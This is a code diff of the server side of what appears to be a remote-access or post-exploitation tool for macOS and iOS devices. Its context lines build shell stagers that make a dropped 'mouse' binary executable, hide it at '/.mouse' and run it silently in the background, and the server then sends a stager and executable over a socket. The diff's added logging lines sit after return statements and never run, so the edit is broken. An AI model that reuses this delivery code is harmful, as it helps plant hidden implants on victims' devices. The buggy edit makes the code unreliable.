@@ -119,6 +119,7 @@ class Server:
             "chmod 777 /private/tmp/mouse;"+\
             "/private/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
+            self.verbose_print("Executing macOS Payload...")
         elif device_arch in self.ios_architectures:
             self.verbose_print("Connecting to iOS...")
             self.verbose_print("Sending iOS Payload...")
@@ -131,7 +132,7 @@ class Server:
             "mv /tmp/mouse /.mouse;"+\
             "/.mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
-            self.sos = "iOS"
+            self.verbose_print("Executing iOS Payload...")
         else:
             h.info_error("The device is not recognized!")
             return
@@ -170,7 +171,6 @@ class Server:
         conn.send(bash_stager)
 
         # send executable
-        self.verbose_print("Executing "+str(self.sos)+" Payload...")
         conn.send(executable)
         conn.close()
         self.verbose_print("Establishing Connection...")
